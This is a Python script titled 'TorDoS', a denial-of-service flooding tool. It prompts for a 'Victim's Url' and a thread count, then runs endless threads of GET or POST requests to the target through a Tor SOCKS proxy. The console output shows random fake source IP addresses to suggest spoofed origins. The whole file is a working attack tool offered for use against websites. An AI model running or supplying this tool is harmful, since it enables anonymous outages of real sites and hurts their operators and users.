import requests
import os
import random
import time
from threading import Thread
from colorama import Fore

print("""
 ______         ___       ____
/_  __/__  ____/ _ \___  / __/
 / / / _ \/ __/ // / _ \_\ \  
/_/  \___/_/ /____/\___/___/  
                              """)


s = requests.session()
s.proxies = {}
s.proxies['http'] = 'socks5h://localhost:9050'
s.proxies['https'] = 'socks5h://localhost:9050'
s.proxies['socks5'] = 'socks5h://localhost:9050'

def fastpost():
	while True:
		try:
			n1 = random.randint(1,254)
			n2 = random.randint(1,254)
			n3 = random.randint(1,254)
			n4 = random.randint(1,254)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			s.post(url)
			print(Fore.GREEN + "Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "From---> " + Fore.WHITE + str(n1)+"."+str(n2)+"."+str(n3)+"."+str(n4) + Fore.CYAN + " //Post Host !" + Fore.WHITE + " ")
		except:
			print(Fore.RED + "Can't Connect To " + Fore.WHITE + str(url))
			print(Fore.RED + "Post Failed 0.0 " + Fore.WHITE + ">Socks Or >Website Is Down . . .")
			s.close()

def fastget():
	while True:
		try:
			n1 = random.randint(1,254)
			n2 = random.randint(1,254)
			n3 = random.randint(1,254)
			n4 = random.randint(1,254)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			s.get(url)
			print(Fore.GREEN + "Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "From---> " + Fore.WHITE + str(n1)+"."+str(n2)+"."+str(n3)+"."+str(n4) + Fore.CYAN + " //Get Host !" + Fore.WHITE + " ")
		except:
			print(Fore.RED + "Can't Connect To " + Fore.WHITE + str(url))
			print(Fore.RED + "Get Host Failed 0.0 " + Fore.WHITE + ">Socks Or >Website Is Down . . .")
			s.close()

def slowpost():
	while True:
		try:
			m1 = random.randint(1,254)
			m2 = random.randint(1,254)
			m3 = random.randint(1,254)
			m4 = random.randint(1,254)
			ts = random.randint(2,4)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			print(Fore.GREEN + "Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.GREEN + "From---> " + Fore.WHITE + str(m1)+"."+str(m2)+"."+str(m3)+"."+str(m4) + Fore.CYAN + " Slow Post Mod Enable " + Fore.WHITE + " ")
			s.post(url)
			time.sleep(int(ts))
		except:
			print(Fore.RED + "Can't Connect To " + Fore.WHITE + str(url) + Fore.WHITE + " ")
			print(Fore.RED + "Post Failed 0.0 " + Fore.WHITE + ">Socks Or >Website Is Down . . .")
			s.close()

def slowget():
	while True:
		try:
			b1 = random.randint(1,254)
			b2 = random.randint(1,254)
			b3 = random.randint(1,254)
			b4 = random.randint(1,254)
			ts = random.randint(2,4)
			ran = random.choice(['login', 'search', 'user', 'panel', 'page', 'register'])
			rann = random.randint(1,6000)
			print(Fore.GREEN + "Tor Service Run " + Fore.WHITE + str(url) + Fore.YELLOW + " Dir : " + Fore.WHITE + "/?"+str(ran)+"="+str(rann))
			print(Fore.RED + "From---> " + Fore.WHITE + str(b1)+"."+str(b2)+"."+str(b3)+"."+str(b4) + Fore.CYAN + " Slow Get Mod Enable " + Fore.WHITE + " ")
			s.get(url)
			time.sleep(int(ts))
		except:
			print(Fore.RED + "Can't Connect To " + Fore.WHITE + str(url) + Fore.WHITE + " ")
			print(Fore.RED + "Get Host Failed 0.0 " + Fore.WHITE + "> Socks Or > Website Is Down . . .")
			s.close()
def main():
	global url
	global s
	url = str(input(Fore.GREEN + "root@bossy:~# Victim's Url : " + Fore.WHITE))
	thr = int(input(Fore.GREEN + "root@bossy:~# Input The Threads : " + Fore.WHITE))
	type = str(input(Fore.GREEN + "root@bossy:~# Slow Mod Or Not ( fast / slow) : " + Fore.WHITE))
	if type =='fast':
		me = str(input(Fore.GREEN + "root@bossy:~# Method ( post / get ) : " + Fore.WHITE))
		if me =='post':
			os.system('clear')
			print(Fore.CYAN + "root@bossy:~# Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "root@bossy:~# Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "root@bossy:~# Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "root@bossy:~# Method : " + Fore.WHITE + "Fast Post Method")
			time.sleep(4)
			for x in range(thr):
				x = Thread(target=fastpost, name=(x))
				x.start()
		elif me =='get':
			os.system('clear')
			print(Fore.CYAN + "root@bossy:~# Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "root@bossy:~# Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "root@bossy:~# Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "root@bossy:~# Method : " + Fore.WHITE + "Fast Get Method")
			time.sleep(4)
			for x in range(thr):
				x = Thread(target=fastget, name=(x))
				x.start()
	elif type =='slow':
		me = str(input(Fore.GREEN + "root@bossy:~# Method ( post / get ) : " + Fore.WHITE))
		if me =='post':
			os.system('clear')
			print(Fore.CYAN + "root@bossy:~# Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "root@bossy:~# Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "root@bossy:~# Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "root@bossy:~# Method : " + Fore.WHITE + "Slow Post Method")
			time.sleep(4)
			for x in range(100):
				x = Thread(target=slowpost, name=(x))
				x.start()
		elif me =='get':
			os.system('clear')
			print(Fore.CYAN + "root@bossy:~# Your Target : " + Fore.WHITE + str(url))
			print(Fore.CYAN + "root@bossy:~# Default Port : " + Fore.WHITE + "80")
			print(Fore.CYAN + "root@bossy:~# Set Thread In : " + Fore.WHITE + str(thr))
			print(Fore.CYAN + "root@bossy:~# Method : " + Fore.WHITE + "Slow Get Method")
			time.sleep(4)
			for x in range(100):
				x = Thread(target=slowget, name=(x))
				x.start()


if __name__ == "__main__":
	main()
